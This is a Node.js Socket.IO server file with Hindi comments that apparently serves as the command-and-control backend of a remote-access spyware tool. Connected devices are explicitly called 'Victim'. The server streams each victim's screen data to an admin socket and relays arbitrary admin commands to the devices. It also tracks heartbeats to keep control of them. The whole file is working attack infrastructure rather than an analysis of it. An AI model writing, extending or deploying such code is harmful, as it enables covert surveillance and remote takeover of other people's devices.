const express = require('express');
const app = express();
const server = require('http').createServer(app);
const { Server } = require('socket.io');
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingTimeout: 60000, // 60 seconds (बढ़ाया)
  pingInterval: 25000, // 25 seconds
  transports: ['websocket', 'polling'],
  allowEIO3: true,
  maxHttpBufferSize: 1e8
});

let devices = {};
let adminSocket = null;
let deviceConnections = {};

const PORT = process.env.PORT || 8080;

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html'); // तुम्हारा HTML file
});

// ============ CONNECTION MANAGEMENT ============
io.on('connection', (socket) => {
  console.log(`🔗 New connection: ${socket.id}`);
  
  // Device (Victim) connection
  socket.on('victim_connect', (deviceInfo) => {
    const deviceId = deviceInfo.deviceId;
    console.log(`📱 Device connected: ${deviceId} (${deviceInfo.deviceName})`);
    
    // Store device connection
    devices[deviceId] = {
      ...deviceInfo,
      socketId: socket.id,
      lastHeartbeat: Date.now(),
      connected: true
    };
    
    deviceConnections[deviceId] = socket;
    socket.deviceId = deviceId;
    
    // Notify admin
    if (adminSocket) {
      adminSocket.emit('new_device_joined', deviceInfo);
      adminSocket.emit('device_list', Object.values(devices).filter(d => d.connected));
    }
    
    // Send acknowledgment to device
    socket.emit('connection_ack', { status: 'connected' });
  });
  
  // Admin connection
  socket.on('admin_join', () => {
    console.log(`👑 Admin connected: ${socket.id}`);
    adminSocket = socket;
    adminSocket.admin = true;
    
    // Send current device list
    const connectedDevices = Object.values(devices).filter(d => d.connected);
    adminSocket.emit('device_list', connectedDevices);
  });
  
  // Screen data from device
  socket.on('screen_data', (data) => {
    const deviceId = socket.deviceId;
    if (!deviceId) return;
    
    // Update last activity
    if (devices[deviceId]) {
      devices[deviceId].lastHeartbeat = Date.now();
    }
    
    // Forward to admin
    if (adminSocket) {
      adminSocket.emit('screen_update', {
        ...data,
        deviceId: deviceId
      });
    }
  });
  
  // Heartbeat from device
  socket.on('heartbeat', (data) => {
    const deviceId = data.deviceId;
    if (devices[deviceId]) {
      devices[deviceId].lastHeartbeat = Date.now();
      devices[deviceId].connected = true;
      
      // Send heartbeat acknowledgment
      socket.emit('heartbeat_ack', { timestamp: Date.now() });
    }
  });
  
  // Command from admin to device
  socket.on('command_to_device', (command) => {
    if (!socket.admin) return;
    
    const { deviceId, action, payload } = command;
    const deviceSocket = deviceConnections[deviceId];
    
    if (deviceSocket && deviceSocket.connected) {
      deviceSocket.emit(action, payload);
      console.log(`📤 Command sent to ${deviceId}: ${action}`);
    } else {
      console.log(`❌ Device ${deviceId} not connected`);
      socket.emit('command_error', { deviceId, error: 'Device not connected' });
    }
  });
  
  // Pong response (keep-alive)
  socket.on('pong', () => {
    // Just update last activity
    if (socket.deviceId && devices[socket.deviceId]) {
      devices[socket.deviceId].lastHeartbeat = Date.now();
    }
  });
  
  // ============ DISCONNECTION HANDLING ============
  socket.on('disconnect', (reason) => {
    console.log(`🔌 Disconnected: ${socket.id} - Reason: ${reason}`);
    
    // If device disconnected
    if (socket.deviceId) {
      const deviceId = socket.deviceId;
      console.log(`📱 Device disconnected: ${deviceId}`);
      
      // Mark as disconnected but keep in list (for auto-reconnect)
      if (devices[deviceId]) {
        devices[deviceId].connected = false;
        devices[deviceId].lastDisconnect = Date.now();
      }
      
      delete deviceConnections[deviceId];
      
      // Notify admin
      if (adminSocket) {
        adminSocket.emit('device_disconnected', deviceId);
      }
    }
    
    // If admin disconnected
    if (socket.admin) {
      console.log('👑 Admin disconnected');
      adminSocket = null;
    }
  });
  
  // ============ ERROR HANDLING ============
  socket.on('error', (error) => {
    console.error(`❌ Socket error from ${socket.id}:`, error);
  });
  
  // ============ KEEP-ALIVE PING ============
  socket.on('ping', () => {
    socket.emit('pong');
  });
});

// ============ HEARTBEAT MONITORING ============
setInterval(() => {
  const now = Date.now();
  const HEARTBEAT_TIMEOUT = 30000; // 30 seconds
  
  Object.keys(devices).forEach(deviceId => {
    const device = devices[deviceId];
    
    if (device.connected && (now - device.lastHeartbeat) > HEARTBEAT_TIMEOUT) {
      console.log(`⚠️ Device ${deviceId} heartbeat timeout`);
      device.connected = false;
      
      // Notify admin
      if (adminSocket) {
        adminSocket.emit('device_disconnected', deviceId);
      }
    }
  });
}, 10000); // Check every 10 seconds

// ============ AUTO-RECONNECT CLEANUP ============
setInterval(() => {
  const now = Date.now();
  const DISCONNECT_CLEANUP = 300000; // 5 minutes
  
  Object.keys(devices).forEach(deviceId => {
    const device = devices[deviceId];
    
    if (!device.connected && device.lastDisconnect && 
        (now - device.lastDisconnect) > DISCONNECT_CLEANUP) {
      console.log(`🗑️ Removing old device: ${deviceId}`);
      delete devices[deviceId];
      delete deviceConnections[deviceId];
    }
  });
}, 60000); // Cleanup every minute

console.log(`✅ Server initialized with enhanced connection management`);
